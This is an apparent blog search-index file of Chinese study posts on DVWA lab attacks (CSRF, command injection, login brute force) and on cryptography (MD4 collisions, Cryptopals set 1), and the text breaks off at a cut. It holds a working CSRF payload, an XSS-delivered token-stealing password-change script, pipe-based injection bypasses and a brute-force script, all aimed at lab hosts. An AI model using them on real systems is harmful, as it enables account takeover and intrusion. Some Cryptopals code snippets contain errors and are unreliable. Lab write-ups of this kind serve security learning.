<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[DVWA(3)-CSRF]]></title>
    <url>%2F2017%2F12%2F03%2FDVWA3-CSRF%2F</url>
    <content type="text"><![CDATA[csrf 全名 cross site request forgery(跨站请求伪造)。 该攻击的核心在于 “服务器信任用户的浏览器所发出的请求就是用户想要的请求”。利用的思想是 想办法取得服务器对该用户的信任(cookie,session等)，并让浏览器发送恶意请求(加载图片，js脚本等)。 许多网站对于用户的认证信息都保存在了浏览器中，比如我们访问许多网站经常都可以跳过输入账号密码的步骤。这使得服务器端对于敏感操作如果不加有效的用户认证的话，容易遭受 csrf 攻击。 low-securitylow-level下没有任何防护措施。 一个重置密码的界面。 用burp suite 抓包取得表单参数。 构造恶意表单123&lt;html&gt; &lt;img src="http://localhost/DVWA/vulnerabilities/csrf/?password_new=haha&amp;password_conf=haha&amp;Change=Change"&gt;&lt;/html&gt; 无论 DVWA 页面是否开启，或者浏览器是否已经关闭过，只要浏览器端对应的cookie存在，那么访问了此恶意页面，通过&lt;img&gt;标签的加载发送恶意请求，攻击就可以实现。 medium-securitymedium-level 中加入了对 Referer 字段的检查。 1stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) 判断 运行服务器的主机名 是否包含在 HTTP 头的 Referer 字段中。 stripos() 返回 参数2 在 参数1 中第一次出现的位置。是 strpos() 不区分大小写的版本。 $_SERVER[] 超全局变量，由服务器创建，保存服务器的一些信息。 SERVER_NAME返回运行脚本的服务器主机名 当请求表单的 Referer 不符合时，将报错: Http 头中的 Referer 字段用来标明请求来源于哪个地址。也就是你是从哪里发起请求的。在安全应用中，可以检查 Referer 字段 与 访问的地址 是否处于同一域名下，来简单地判断用户的操作是否正常。 从前面的截图可以中看到 referer。 其值为 http://172.16.65.130/DVWA/vulnerabilities/csrf/ PHP 官方文档对$_SERVER[&#39;SRVER_NAME&#39;]作了注释： 在 Apache 2 里，必须设置 UseCanonicalName = On 和 ServerName。 否则该值会由客户端提供，就有可能被伪造。 上下文有安全性要求的环境里，不应该依赖此值 以下是 Wikipedia 中对于用检查 Referer 方式防御 CSRF 的评论： 这种办法简单易行，但因其完全依赖浏览器发送正确的Referer字段,并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。 可以看出，这种方式并不安全。 用Burp Suite 可以直接修改 Referer 字段。 服务器的地址为 http://172.16.65.130//DVWA/vulnerabilities/csrf/，那么将恶意表单的文件名改为 172.16.65.130.html，就可以成功绕过检查。 high-level在 high-level 中，用到了如今防御 csrf 常用的方法：csrf token 那么我们是否能在自己的恶意页面中运行js脚本取得目标页面的token呢？答案是不行。现在的浏览器普遍对跨域请求资源有访问控制。对于需要验证的资源，跨域请求会被拒绝。 这里我们结合 xss 漏洞来利用。DVWA的xss项目共有 DOM，reflect,store 3种。这里用 DOM来演示。xss的相关细节还是放到xss篇再来讲吧。(Google浏览器中有 xss auditor，会自动将输入的所有疑似 js 代码屏蔽，因此这里使用 Firefox) 这里用?default#&lt;script&gt;alert(&quot;haha&quot;)&lt;/script&gt;可以成功运行js代码。 当我们成功注入js文件test.js到目标站点时，可以用以下url来实现攻击http://172.16.65.134/DVWA/vulnerabilities/xss_d/?default=English#&lt;script src=&quot;http://172.16.65.134/test.js&quot;&gt;&lt;/script&gt; test.js脚本内容123456789101112131415161718192021222324var theUrl = 'http://172.16.65.134/DVWA/vulnerabilities/csrf/';var pass = 'admin';xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials = true;var hacked = false;xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; var text = xmlhttp.responseText; var regex = /user_token\' value\=\'(.*)\' \/\&gt;/; var match = text.match(regex); var token = match[1]; var new_url = 'http://172.16.65.134/DVWA/vulnerabilities/csrf/?user_token='+token+'&amp;password_new='+pass+'&amp;password_conf='+pass+'&amp;Change=Change' if(!hacked)&#123; alert('Got token:' + match[1]); hacked = true; xmlhttp.open("GET", new_url, false ); xmlhttp.send(); &#125; count++; &#125;&#125;;xmlhttp.open("GET", theUrl );xmlhttp.send(); 弹出消息，说明攻击成功，此时admin的password已经改为了admin 总结起来，首先需要注入恶意脚本到目标站点，然后令用户的浏览器访问以上链接，来通过xss漏洞执行脚本实现csrf攻击。其实这算是xss攻击了，csrf更像是攻击成功之后的利用。 impossible-level此level下，修改密码需要输入当前的密码。 虽然在现实应用中一般不会有这样的设定，但是基本思想就是 对于敏感操作，需要多重的验证，来充分说明当前的动作确实是用户想要进行的，而不是被恶意诱导后在不知情的情况下秘密进行。 附录UseCanonicalName一般服务端会根据用户提供的URL以及端口来提供响应的页面。那么诸如主机名 $_SERVER[&#39;SERVER_NAME&#39;](php) 就会由客户端提供。但是对于一些不会跳转到别的主机的页面来说，它的 $_SERVER[&#39;SERVER_NAME&#39;] 只有一个，根本不需要用户来提供，那么就可以设置 UseCanonicalName=On 配合 ServerName=‘…’ ，使得 $_SERVER[&#39;SERVER_NAME&#39;] 的值直接由服务器端来提供。 新发布的 OWASP2017 中删去了 CSRF，原因是只有不到5%的应用程序中能发现 CSRF，且只在8%左右的应用程序中发现未验证的重定向和转发。]]></content>
      <tags>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA(2)-command injection]]></title>
    <url>%2F2017%2F11%2F22%2FDVWA2-Exec%2F</url>
    <content type="text"><![CDATA[该漏洞允许用户在服务器上执行任意命令。 该命令与 code injection 的区别在于：code injection 与注入的语言有关，比如 服务器上执行的语言为 php，那么可利用漏洞执行 php 代码。如PHP中的 require，eval() 等，都容易引发 code injection 漏洞。 而 command injection 常常发生于 服务器对输入 不加有效过滤而传给 system shell 执行，从而被恶意利用。如果被利用的程序权限较高，那么后果将是灾难性的。 常见的测试方式是利用 |管道符 &amp;和;连接符 &amp;&amp;逻辑与(前一命令执行成功，则后面命令也执行) ||逻辑或(前面命令执行失败，才执行后面的命令)等符号执行其他命令。 Low-level允许我们输入一个 IP 地址，然后输出 ping 的结果。 Low-level 下依然是没有任何防御措施，直接将 ping与 输入连接，然后传给 shell_exec() 执行。可以直接用上面的 连接符号 在 shell 中执行其他命令。 12345678910111213if( isset( $_POST[ 'Submit' ] ) ) &#123; $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125;else &#123; // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); &#125;$html .= "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;";&#125; stristr() 查找字符串首次出现位置。与 strstr() 的区别是它忽略大小写。 phpuname() 运行服务器的操作系统信息。 ‘s’参数返回“操作系统名称”，与Unix命令uname参数同理。 Medium-levelMedium-level 下，过滤了几个连接符，使用它们就不会返回结果。但还是能用 &amp; 连接多个命令。 查看源码，发现多了这么几句代码1234567// Set blacklist$substitutions = array( '&amp;&amp;' =&gt; '', ';' =&gt; '',);// Remove any of the charactars in the array (blacklist).$target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 这属于有防护的思想，但是防护能力并不好。比如将其中的 &amp;&amp; 换成 &amp; 就会更好。即使如此，用|依然能执行其他命令 high-levelhigh-level 依然采用黑名单的方式，将某些符号过滤。不过这次过滤地更全面了。 1234567891011$substitutions = array( '&amp;' =&gt; '', ';' =&gt; '', '| ' =&gt; '', '-' =&gt; '', '$' =&gt; '', '(' =&gt; '', ')' =&gt; '', '`' =&gt; '', '||' =&gt; '',); 然而这里令人很匪夷所思的是它不愿直接过滤|，导致了过滤的漏洞。其实还可以过滤掉 \ 和 空格，来进一步加强安全性。 str_replace() 按照数组中的内容进行替换时的执行逻辑为 ： 先按照array的第一行一直替换，直到没有匹配。再按照数组的第二行一直替换，直到没有匹配。再… 绕过的方式有 奇数个|，右边不跟空格 任意多个 |后跟n个空格，那么按照array第三行的规则一直消去。直到右边没有空格时，还剩下奇数个|即可。 impossible 使用 stripslashes() 删除了反斜杠 使用 explode() 将 输入按照 . 分成4组，检查每一组是否为数字。若不是4组或者某一组不是数字，则返回错误。 采用白名单的方式，只允许 数字 和 . 作为输入，十分有效。 防御 command injection 尽量避免调用 shell , 如 system() , exec() , shell_exec() 等函数 采用白名单或黑名单的方式，仔细过滤输入。 如今在网站中很难发现明显的 command injection 漏洞，一般都需要用 自动化工具进行模糊测试什么的。如何测试、发现command injection漏洞，这又是另一个话题了。 command injection 可以说是最难发现的web漏洞之一，但其带来的影响也是灾难性的。]]></content>
      <tags>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA(1)-Brute Force]]></title>
    <url>%2F2017%2F11%2F18%2FDVWA1-BruteForce%2F</url>
    <content type="text"><![CDATA[最近打算开始分析一下 dvwa 项目的源码，趁此机会再把 web安全 以及 php 的基础知识复习一遍。 既然要全部分析，那就按顺序来吧。 DVWA 的第一个项目为 Brute Force，暴力穷举。 在 dvwa的对应页面中，我们需要做的就是爆破登陆界面的账号密码。这里假设我们已经确定了 用户名为 admin ，爆破其密码。 Low-level先用 Burp Suite 抓包 现在我们使用 hydra 工具进行爆破。需要准备的内容如下： 目标 ipv url 路径 cookie 密码错误返回的消息 密码表 接下来开始爆破 因为 Low-level 下提交表单用的是 Get 方式，所以上面的 Service 参数填 http-get-form。 试错密码时页面会返回消息 Username and/or password incorrect.，这个也要填上去。 Low-level 本身比较简单，基本没有任何防御。这个密码表也是我临时构建的，所以试的次数也不多，主要是为了演示。 Medium-level在 Medium-level 中，加入了 mysqli_real_escape_string() 对输入进行过滤，应该是考虑到 sql注入。而针对 爆破，则加入了sleep(2)，在每次输入错误后等2秒再响应，这就导致了爆破的成本增加。其实如果改进一些，可以设置为每错一次，等待时间延长1倍。 除此之外也没有别的改动了，form提交方式依然是 get ，用low-level的方式依然可以爆破。在实际应用中如果 admin 的密码设得复杂的话此法可以大幅增加爆破耗时。 High-level 在 High-level 中加入了一种防御措施 – token(令牌)。每次登陆时服务端会先验证 token 正确性，再验证账号密码。查看 html 源码可以直接看见，但是每次刷新页面都会更新的一个随机数。 每次试错密码会随机 sleep 0～3秒。 延时问题不大，主要需要解决的是 token 验证问题。 这样一来直接使用工具就有一定的局限性了，不过我们可以构造脚本来解决这个问题。写一个 python 脚本： 借助 requests 库 接收html 和发送 http 请求。 借助 BeautifulSoup 库提取 html 的内容，我们用它来取出html中的 session_token 值，加入到发送的表单中去。 需要准备的： 有效cookie 密码表 下面是演示脚本。1234567891011121314151617181920import requestsfrom bs4 import BeautifulSoupimport repass_list = open('password_list.txt','r').readlines()url = "http://localhost/DVWA/vulnerabilities/brute/"cookies = dict(PHPSESSID="435ab4cd1fe6acf25ab6716c4556fa7d",security="high")response = requests.get(url,cookies=cookies)for i in pass_list : soup = BeautifulSoup(response.text,"html.parser") tag = soup.find_all('input')[3] payload = &#123;'username':'admin','password':i[:-1],'Login':'Login','user_token':tag['value']&#125; response = requests.get(url,params=payload,cookies=cookies) if not re.findall('Username and/or password incorrect.',response.text) : print('password found ! ',i) break else : print('token :'+tag['value']+'try "'+i[:-1]+'" failed.') impossibleimpossiple-level 的源码中用到了： 数据库方面使用 PHP数据对象(PDO) 和 预处理语句。使用PDO可以实现对于不同的数据库使用相同的方法查询、获取数据。PDO的定义部分见 配置文件 dvwaDatabaseConnect()函数。预处理语句可以防止 sql注入攻击。 在试错了密码之后，服务器会更新数据库，记录该账号的失败登陆次数。如果失败次数超过3次，账号会被锁定15min。如果你在账号锁定期间继续登陆，那么15min计时将会重置。锁定解除以后，每错误一次，失败次数都会加1(也就是永远大于3)。直到成功登陆，失败次数才会清零 在这样的机制下，暴力破解无法继续。 附录 可以在 源码中多次看到 $GLOBALS[&quot;___mysqli_ston&quot;] 这个变量，它的定义在 /dvwa/includes/DBMS/MYSQL.php 中，dvwa 用这个全局变量来指代 $connect=mysqli_connect(&#39;localhost&#39;,&#39;username&#39;,&#39;password&#39;,&#39;database_name&#39;); dvwaPageNewGrab() 里面存放了一些标题名啥的，不用太在意。 DVWA v1.10 , Apache 2.4.27 , mysql 5.7.20 , php 5.6.30]]></content>
      <tags>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dvwa登陆机制与cookie,session]]></title>
    <url>%2F2017%2F11%2F18%2Fdvwa%E7%99%BB%E9%99%86%E6%9C%BA%E5%88%B6%E4%B8%8Ecookie-session%2F</url>
    <content type="text"><![CDATA[要了解 dvwa 的架构，先看其登陆页面的机制以及其 cookie 和 session 的设置。 dvwa 的自定义函数基本都在 /dvwa/includes/dvwaPage.inc.php 中，从每个文件的 require应该就能看出来。以下简称该文件为 配置文件。 sessiondvwa 中的 session 主要用来 检查登陆、生成token。 session_start() 在 /dvwa/includes/dvwaPage.inc.php 中。 在 523-545 行集中定义了有关 token 的 生成generateSessionToken()、插入表单tokenField()、检查checkToken()、销毁destroySessionToken() 函数。 其中生成的方式为 $_SESSION[ &#39;session_token&#39; ] = md5( uniqid() ); cookiecookie 主要用来控制 security-levels 登陆与检查登陆机制PHPSESSID 和 security 两个 cookie 在运行配置文件时就已经自动生成，所以并不能用它来证明你已登陆。确定你是否登陆的是你这个 PHPSESSID 对应的 session 在 服务器中是否保存着值。 登陆过程主要看 login.php。 登陆的时候首先包含并运行 配置文件，并在登陆验证成功后调用 dvwaLogin() ，进而调用dvwaSessionGrab()生成默认$_SESSION[&#39;dvwa&#39;]，通过 dvwaSession变量修改 $_SESSION[&#39;dvwa&#39;]。最后用户名存放在 $_SESSION[&#39;dvwa&#39;][&#39;username&#39;] 中。 在登陆成功之后的各个页面中，都有这么个函数：dvwaPageStartup()，该函数是拿来检查用户是否登陆的。它调用dvwaIsLoggedIn() 来判断是否登陆。该函数返回 dvwaSession[&#39;username&#39;] 是否设置 的bool值。 dvwaSessionGrab()函数 在没有 $_SESSION[&#39;dvwa&#39;] 数组时创建它。返回$_SESSION[&#39;dvwa&#39;] 的值。 $dvwaSession = &amp;$_SESSION[&#39;dvwa&#39;]]]></content>
      <tags>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MD4 Collisions]]></title>
    <url>%2F2017%2F11%2F06%2Fmd4-collision%2F</url>
    <content type="text"><![CDATA[cryptopals challenge 55 MD4 介绍1990年出现，基于 Merkle-Damgard 架构。它影响了后来的 MD5，SHA1等算法。 hash值长度128bits. 过程 将 message pad 成 512 bit 的倍数 按顺序将每一组 512 bit 通过 compression function 压缩成 128bit，最后一组得到的128bit就是hash值 压缩函数compression function 共有3轮，每一轮用到一个不同的函数 $F(X,Y,Z)=(X\wedge Y)\vee(\daleth X\wedge Z)$ $G(X,Y,Z)=(X\wedge Y)\vee (X\wedge Z)\vee(Y\wedge Z)$ $H(X,Y,Z)=X\oplus Y\oplus Z$ 上面的 X,Y,Z都是 32bit的字，与或非等运算都是按位运算 三轮的计算分别是： $\phi _0(a,b,c,d,m_k,s)=((a+F(b,c,d)+m_k)\ mod\ 2^{32})\lll s$ $\phi _1(a,b,c,d,m_k,s)=((a+G(b,c,d)+m_k+0x5a827999)\ mod\ 2^{32})\lll s$ $\phi _2(a,b,c,d,m_k,s)=((a+H(b,c,d)+m_k+0x6ed9eba1)\ mod\ 2^{32})\lll s$ 其中s是一个step-dependence constant，$\lll$s 是循环左移s位。 a,b,c,d的初始值为 0x67452301，0xefcdab89，0x98badcfe，0x10325476 对于一个512bit长的block，先将它分成16块(m0,m1…m15)，每块32bit，压缩函数这样工作： 令(aa,bb,cc,dd)作为chaining variable其中如果该block是第一个block，那么 chaining variable 就设为初始的a,b,c,d的值，如果不是，那就用前一block输出的值。每一轮有16步，4个chaining variable 在这16步中分别会更新4次。总共3轮下来更新了12次。 执行下面的算式，共48步：对于 j=0,1,2，最开始的a,b,c,d为前面的aa,bb,cc,dd$a=\phi _j(a,b,c,d,m_i,s_1)$$d=\phi _j(d,a,b,c,m_i’,s_2)$$c=\phi _j(c,d,a,b,m_i’’,s_3)$$b=\phi _j(b,c,d,a,m_i’’’,s_4)$ 第一轮 j=0，[$m_i,m_i’,m_i’’,m_i’’’$] 为 [0 1 2 3]，[4 5 6 7]，[8 9 10 11]，[12 13 14 15]，$s_1,s_2,s_3,s_4$分别为3 7 11 19 第二轮 j=1，[$m_i,m_i’,m_i’’,m_i’’’$] 为 [0 4 8 12]，[1 5 9 13]，[2 6 10 14]，[3 7 11 15]，$s_1,s_2,s_3,s_4$分别为3 5 9 13 第三轮 j=2，[$m_i,m_i’,m_i’’,m_i’’’$] 为 [0 8 4 12]，[2 10 6 14]，[1 9 5 13]，[3 11 7 15]，$s_1,s_2,s_3,s_4$分别为3 9 11 15 最终得到 $a_{12},b_{12},c_{12},d_{12}$ 将计算得到的 a,b,c,d 与输入的 aa,bb,cc,dd进行下列计算$aa=(a+aa)\ mod\ 2^{32}$$bb=(b+bb)\ mod\ 2^{32}$$cc=(c+cc)\ mod\ 2^{32}$$dd=(d+dd)\ mod\ 2^{32}$ 最终得到的 aa,bb,cc,dd作为该block的输出，给到下一个block如果当前block是最后一个，那么 aa|bb|cc|dd 这128bit就是最终hash。 Differential cryptanalysis 差分密码分析下面是 wikipedia 中对于 差分密码分析的一些解释：这是对于分组密码的首选分析方法。它属于 chosen-plaintext attack广义上说，这是研究 输入的不同能如何影响输出的不同。 选择多对明文，每对明文之间的差别是 相同的 计算这些明文产生的密文的差别 从统计的角度来分析它们的规律。 一对明文的差别与一对密文的差别这两个值合起来称为 differential，它的统计学性质取决于 加密用的 S-box如果某个 密文差别 比较频繁，那么就可以断定它不是随机的。 Chosen-Message Pre-Image Attack to MD4This attack can find collisions with probability 2^−2^ to 2^−6^ and with complexity less than 2^8^ MD4 hash operations 如果某 Message 满足了一些特定的限制条件，使得对其进行少许改变能导致 hash collision，那么称此 Message 为 Weak Message. 对于任何 weak message M，满足下面性质的 M’ 都会与其 碰撞。$\Delta M=M’-M=(\Delta m_0,\Delta m_1,… …,\Delta m_{15})$such that: $\Delta m_1=2^{31},\Delta m_2=2^{31} - 2^{28},\Delta m_{12}=-2^{16},\Delta m_i=0,0\leqslant i\leqslant 15,i\neq 1,2,12$ 这是 weak message 需要满足的条件： 总共是 121个限制条件，所以任意一条message，其满足上述条件的概率为2^-121^ 那么，此攻击的核心就在于：如何构造满足上面限制的 message 第一轮对于MD4 的第一轮16步来说，要构造满足上述条件的message还是比较容易的。对于 M[i]，执行类似下面的步骤： 按照原步骤计算 a1$a_1=((a_0+F(b_0,c_0,d_0)+m[0])\ mod\ 2^{32})\lll 3$ 根据限制条件，构造 a1‘$a_1’=a_1\oplus((a_1\oplus b_0)\wedge(1\ll i))$ 调整 m[0]’$m[0]’=(a_1’\ggg 3)-a_0-F(b_0,c_0,d_0)\ mod\ 2^{32}$ 如此往复 第二轮第二轮就没有第一轮这么简单了。虽然第二轮中的限制条件与第一轮中的没有重叠部分，但是如果在第二轮中改变了 m[0]，那么第一轮中计算的 a1 就也跟着变了，a1 变了那么后面所有跟 a1 有关的限制条件的计算也都白费了。 论文中给出的解决方法是：调整 m[i]，使得当 a1 改变的时候，其他与其相关的 chaining variables 保持不变。 下面说一说如何实现它： 第二轮的第一步：$a_5=((a_4+G(b_4,c_4,d_4)+m[0]+0x5a827999)\ mod\ 2^{32})\lll 3$ 那么 m[0]变为$m[0]’=(a_5’\ggg 3)-a_4-G(b_4,c_4,d_4)-0x5a827999\ mod\ 2^{32}$ a1也随之更新$a_1’=((a_0+F(b_0,c_0,d_0)+m[0]’)\ mod\ 2^{32})\lll 3$ d1 本来也要按照下式随着 a1 更新$d_1=((d_0+F(a_1,b_0,c_0)+m[1])\ mod\ 2^{32})\lll 7$但是我们来重新构造 m[1]，使得 d1 不需要更新$m[1]’=(d_1\ggg 7)-d_0-F(a_1’,b_0,c_0)\ mod\ 2^{32}$ m[2],m[3],m[4] 也同理$m[2]’=(c_1\ggg 11)-c_0-F(d_1, a_1’, b_0)\ mod 2^{32}$$m[3]’ = (b_1 \ggg 19) - b_0 - f(c_1, d_1, a_1’) \mod 2^{32}$$m[4]’ = (a_2 \ggg 3) - a_1’ - f(b_1, c_1, d_1) \mod 2^{32}$改变了这些以后，第一轮又可以顺利执行了。]]></content>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cryptopal-set1]]></title>
    <url>%2F2017%2F10%2F22%2FCryptopal-set1%2F</url>
    <content type="text"><![CDATA[一个与密码学有关的题集，适合入门。我在结合了网上的解法后，做了些笔记，供以后参考。 题目链接 以下所有代码均使用 Python3 1. Convert hex to base64 题目大意：提供了一串hex encoded字符串 1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736要求将其转换为 base64 编码并且题目中推荐用 字节型数据 进行操作。 关于base64编码，python3 中有原生库base64可用，但是base64.encode() 只能接收 字节串。 binascii.unhexlify() 将 16进制字符串 转换为 ASCII编码的字节串。 base64.b64encode() 接收/输出 字节串所以结果需要用 decode(‘ascii’) 转换为 字符串(字符串转字节串可以用encode(‘ascii’) )。 1234567import binasciiimport base64x = '1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736'decode = binascii.unhexlify(x)b = base64.b64encode(decode).decode('ascii')print(b) 2. Fixed XOR 题目大意：要求写一个函数，接受2个同长度的输入，并产生它们xor后的值。比如：1c0111001f010100061a024b53535009181cxor686974207468652062756c6c277320657965will produce746865206b696420646f6e277420706c6179 1234567891011import binasciifrom Crypto.Util.strxor import strxorencoded1 = '1c0111001f010100061a024b53535009181c'encoded2 = '686974207468652062756c6c277320657965's = binascii.unhexlify(encoded1)t = binascii.unhexlify(encoded2)u = strxor(s, t)print(u) Crypto.Util.strxor.strxor() 函数接收 2 个等长字符串，将它们异或，返回 ASCII 形式的结果。 下面是不用库函数的解法： python 中的 按位异或操作符^ 只能操作 数字，而不能是 string。12345678910def xor(str1,str2): result = hex(int(str1,16)^int(str2,16) ) return result print(b[2:])str1 = "1c0111001f010100061a024b53535009181c"str2 = "686974207468652062756c6c277320657965"res = xor(str1,str2)print(res)print(binascii.unhexlify(res)) 3. Single-byte XOR cipher 题目大意：给一个 hex encoded string1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736它是被一个string被一个字符 xor 后得到的。找到这个字符，并复原 string 在这个题目中我们需要对字符 key 以ASCII编码的范围(即0～255) 进行一次穷举，然后将所有的256种情况中可能性最大的情况输出 一般结果中空格最多的最有可能是明文，而本道题确实满足这点。 12345import binasciiencoded = '1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736'nums = binascii.unhexlify(encoded)strings = (''.join(chr(num ^ key) for num in nums) for key in range(256))print( max(strings, key=lambda s: s.count(' ')) ) 或者按照题目中推荐的，建立字母频率表，更加严谨地解该题。这也有利于解后面的题目。 12345678910111213141516171819202122232425262728293031import binasciifrom Crypto.Util.strxor import strxor_c# From http://www.data-compression.com/english.htmlfreqs = &#123; 'a': 0.0651738,'b': 0.0124248,'c': 0.0217339 'd': 0.0349835, 'e': 0.1041442,'f': 0.0197881,'g': 0.0158610,'h': 0.0492888, 'i': 0.0558094,'j': 0.0009033,'k': 0.0050529,'l': 0.0331490, 'm': 0.0202124,'n': 0.0564513,'o': 0.0596302,'p': 0.0137645, 'q': 0.0008606,'r': 0.0497563,'s': 0.0515760,'t': 0.0729357, 'u': 0.0225134,'v': 0.0082903,'w': 0.0171272,'x': 0.0013692, 'y': 0.0145984,'z': 0.0007836,' ': 0.1918182 &#125; #可以看到空格的频率远高于任何字母def score(s): #返回每个字符串的总得分数 score = 0 for i in s: c = chr(i).lower() if c in freqs: score += freqs[c] return scoredef breakSingleByteXOR(s): #返回key的ASCII码以及得分最高的字符串 def getkey(p): return score(p[1]) return max( [ (i, strxor_c(s, i)) for i in range(0, 256)] , key=getkey) if __name__ == '__main__': encodedS = '1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736' s = binascii.unhexlify(encodedS) print(breakSingleByteXOR(s)) Crypto.Util.strxor.strxor_c() 函数接收一个字符串，一个int数字(0~255)，用该int数字分别与 字符串中的各个字符xor，返回 ASCII 编码的结果 4. Detect single-character XOR 题目大意：提供了一个文件，里面是 n 个长度60的string，其中一个string是被一个 single-character xor 后得到的，找到它。 题目推荐用题3中的得分函数来辅助完成，如果完成了题3,那么此题应该问题不大 1234567891011121314151617181920212223import binasciiimport challenge3def decodeLines(filename): #构建一个生成器，每次返回文件的一行 f = open(filename, 'r') for line in f: if line[-1] == '\n': line = line[:-1] s = binascii.unhexlify(line) yield sdef findSingleByteXOR(lines): #返回目标行的行数以及内容 brokenLines = [challenge3.breakSingleByteXOR(x)[1] for x in lines] #列表brokenlines是文件的每一行各自得分最高情况的集合 def score(i): return challenge3.score(brokenLines[i]) #从每一行的得分最高情况中再选出得分最高的一行 maxI = max(range(len(brokenLines)), key=score) return (maxI+1, brokenLines[maxI])if __name__ == '__main__': print(findSingleByteXOR(decodeLines('4.txt'))) 5. Implement repreating-key XOR 题目大意：提供一串英文，要求用 key ICE 对这段英文进行异或。Burning ‘em, if you ain’t quick and nimbleI go crazy when I hear a cymbal 如果知道 字节串 的一个性质，那么这个题就十分简单。我们都知道 字符串 在python中可视为一个 数组，单字符为其元素。s1 = ‘str’ ，则 s1[1] -&gt; ‘t’而 ==字节串 也可以视为一个数组，元素是 其字符的ASCII码，即int==s2 = b’str’ ，则 s2[1] -&gt; 116既然元素是 int，那么就可以直接用 按位异或符^进行异或了。 bytes() 将 int 数组按照 ASCII 转换为字节串 12345678910111213import binasciidef RepeatingKeyXor(s, key): return bytes([s[i] ^ key[i % len(key)] for i in range(len(s))]) #接受一个int数组，bytes()会按照ASCII返回对应的字节串x = b'''Burning 'em, if you ain't quick and nimbleI go crazy when I hear a cymbal'''key = b'ICE'y = RepeatingKeyXor(x, key)encodedY = binascii.hexlify(y).decode('ascii')print(encodedY) 6.Break repeating-key XOR 题目大意：提供一个文件，其内容是明文经过 repeating-key xor 后 base64 编码得到的。要求将其解密。 这个题目可以说是 Set1 解题过程中的一道坎。不过还好题目给出了解题思路。 先说一个读取文件的小细节。文件内容是有许多换行符的，那么这些换行符是否会对 base64 解密产生影响呢？ base64的编码内容中只有A-Z a-z 0-9 / + 64个字符，以及凑数的=，没有 \n ，所以并不需要担心文件内容中的换行符会对解码结果产生影响。 解题第一步，我们需要写一个函数求出 2 string 间的 hamming 距离。 求 2个string 的 hamming 距离可以通过 将 2 个 string xor，然后数出结果中有几个 bit 为 1 。 然后需要解决的就是得到 KEYSIZE ，题目提示中给出的方式是： 对于每一个 KEYSIZE，将密文按照 KEYSIZE 长度分成若干组，每个组有 KEYSIZE 个字符。 从其中取出几组(比如 4组)，组与组之间计算 hamming distance/KEYSIZE 的值。 然后计算 这些值的总和/这些值的数量，得到一个平均值。最终得到的这个值最小，对应的那个 KEYSIZE 应该就是 目标KEYSIZE 知道了 KEYSIZE 后，执行最后的解密阶段： 将密文按照 KEYSIZE 分组 取每个组的第1个字符，得到一个集合，再取每个组的第2个字符得到另一个集合… …(相当于求转置矩阵) 将每一个集合看作是一个 single-byte XOR 的题目，解出 key 用这个 key 对 base64 解码的密文 xor ，得到明文 itertools.zip_longest()可以方便地求转置矩阵。它取出所有参数的第1个元素组成一个元组，再取出所有第2个元素组成一个元组… … 1234567891011121314151617181920212223242526272829303132333435import base64import itertoolsimport single_byte_XOR as challenge3import repeating_key_XOR as challenge5#calculate the hamming distance between str1 and str2def hamming(str1,str2): return sum([ bin(str1[i]^str2[i]).count('1') for i in range(len(str1)) ]) #由于字节串的每个元素都是数字，所以可以直接逐个xor ，然后转bin字符串，数出 1 的个数。#求出可能的KEYSIZEdef normalizedEditDistance(x, k): blocks = [x[i:i+k] for i in range(0, len(x), k)][0:8] #按 k 为长度分组 pairs = list(itertools.combinations(blocks, 2)) scores = [hamming(p[0], p[1])/float(k) for p in pairs] return sum(scores) / len(scores) #len(scores) is 6 because there are only 6 combinations of 4 blocks#将密文按KEYSIZE分组，取出每组的第1、2、3...位，得到block1def getKey(x,k): blocks = [ x[i:i+k] for i in range(0,len(x),k) ] key = b'' transposedBlocks = list(itertools.zip_longest(*blocks,fillvalue=0)) key = [challenge3.breakSingleByteXOR(bytes(i))[0] for i in transposedBlocks] return bytes(key)if __name__ == "__main__" : data = base64.b64decode(open('6.txt','r').read()) keysize = min(range(2, 41), key=lambda k: normalizedEditDistance(data, k)) key = getKey(data,keysize) plaintext = challenge5.encodeRepeatingKeyXor(data,key).decode('ascii') print(plaintext) 7. AES in ECB mode 题目大意：Base64 编码的内容通过AES-128 in ECB mode 加密，密钥为YELLOW SUBMARIME。将其解密。 ECB 是 Block cipher mode of operation 中最简单的一种。 直接调用 Crypto.Cipher 库解决。 123456789import base64from Crypto.Cipher import AESdata = base64.b64decode(open('7.txt','r').read())key = b'YELLOW SUBMARINE'cipher = AES.new(key,AES.MODE_ECB)result = cipher.decrypt(data)print(result.decode('ascii')) 8. Detect AES in ECB mode 一个文件中有许多段 hex-encoded 密文。其中有一段用 AES-ECB 模式加密。找出它。注意 ECB 模式是无状态(stateless)且确定性(deterministic)的；同样的 16 字节长明文块 加密会得到 同样的 16 字节密文块。 按照题目的提示，我们将每一段密文按照 16字节长度进行分组，计算两两分组之间是否相同。 1234567891011121314151617181920import detect-single-byte-xor as challenge4import itertoolslines = challenge4.decodeLines('8.txt')def score(x): lens = 16 blocks = [x[i:i+k] for i in range(0,len(x),lens) pairs = itertools.combinations(blocks,2) count = 0 for p in pairs: if p[0] = p[1]: count += 1 return countlinenumber = 1for l in lines: if score(l)&gt;0: print(linenumber) linenumber += 